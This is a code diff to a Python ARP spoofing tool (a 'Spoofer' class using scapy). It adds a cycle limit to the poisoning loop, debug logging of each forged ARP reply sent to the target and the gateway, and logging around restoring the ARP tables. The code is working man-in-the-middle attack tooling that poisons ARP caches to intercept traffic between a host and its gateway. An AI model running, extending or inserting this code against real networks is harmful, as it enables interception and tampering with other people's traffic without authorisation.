@@ -33,6 +33,7 @@ class Spoofer:
         jitter: float = 0.0,
         timeout: float = DEFAULT_TIMEOUT,
         retries: int = DEFAULT_RETRIES,
+        cycles: int = 0,
         scapy=None,  # injectable scapy module (used by tests)
     ) -> None:
         self.target_ip = target_ip
@@ -49,6 +50,7 @@ class Spoofer:
             self.jitter = self.interval
         self.timeout = max(0.1, float(timeout))
         self.retries = max(1, int(retries))
+        self.cycles = max(0, int(cycles))  # 0 = run until interrupted
         self._scapy = scapy
         self._mac_cache: Dict[str, str] = {}
         self._validate()
@@ -98,6 +100,7 @@ class Spoofer:
                 time.sleep(min(0.5 * attempt, self.timeout))
         if mac:
             self._mac_cache[ip] = mac
+            log.debug("Resolved MAC %s for %s", mac, ip)
         return mac
 
     def spoof(self) -> int:
@@ -118,6 +121,13 @@ class Spoofer:
             verbose=False,
         )
         sent += 1
+        log.debug(
+            "Sent spoofed ARP reply: op=2 psrc=%s pdst=%s hwdst=%s iface=%s",
+            self.gateway_ip,
+            self.target_ip,
+            target_mac,
+            self.interface or "default",
+        )
 
         gateway_mac = self.resolve_mac(self.gateway_ip)
         if gateway_mac is None:
@@ -132,6 +142,13 @@ class Spoofer:
             verbose=False,
         )
         sent += 1
+        log.debug(
+            "Sent spoofed ARP reply: op=2 psrc=%s pdst=%s hwdst=%s iface=%s",
+            self.target_ip,
+            self.gateway_ip,
+            gateway_mac,
+            self.interface or "default",
+        )
         return sent
 
     def _send_restore(self, dest_ip: str, dest_mac: str, source_ip: str, source_mac: str) -> None:
@@ -148,6 +165,15 @@ class Spoofer:
             count=RESTORE_COUNT,
             iface=self.interface,
             verbose=False,
+        )
+        log.debug(
+            "Sent restore ARP reply: op=2 psrc=%s hwsrc=%s pdst=%s hwdst=%s count=%d iface=%s",
+            source_ip,
+            source_mac,
+            dest_ip,
+            dest_mac,
+            RESTORE_COUNT,
+            self.interface or "default",
         )
 
     def restore(self) -> int:
@@ -173,17 +199,25 @@ class Spoofer:
             log.info("Restored ARP table for %s", dest_ip)
         return restored
 
-    def run(self, progress: Optional[Callable[[int], None]] = None) -> int:
-        """Run the spoofing loop until interrupted; ALWAYS restores ARP tables on exit.
+    def run(self, progress: Optional[Callable[[int, int], None]] = None) -> int:
+        """Run the spoofing loop until interrupted or ``cycles`` cycles complete.
 
-        Returns the total number of packets sent during the run.
+        ARP tables are ALWAYS restored on exit (including after hitting a cycle
+        limit). Returns the total number of packets sent. If ``progress`` is
+        given it is called with ``(packets_sent, cycles_completed)`` after every
+        cycle.
         """
         sent = 0
+        cycles_done = 0
         try:
             while True:
                 sent += self.spoof()
+                cycles_done += 1
                 if progress is not None:
-                    progress(sent)
+                    progress(sent, cycles_done)
+                if self.cycles and cycles_done >= self.cycles:
+                    log.info("Reached the requested cycle limit (%d); stopping", self.cycles)
+                    break
                 time.sleep(self.interval + random.uniform(0.0, self.jitter))
         except KeyboardInterrupt:
             log.info("Interrupt received; restoring ARP tables...")
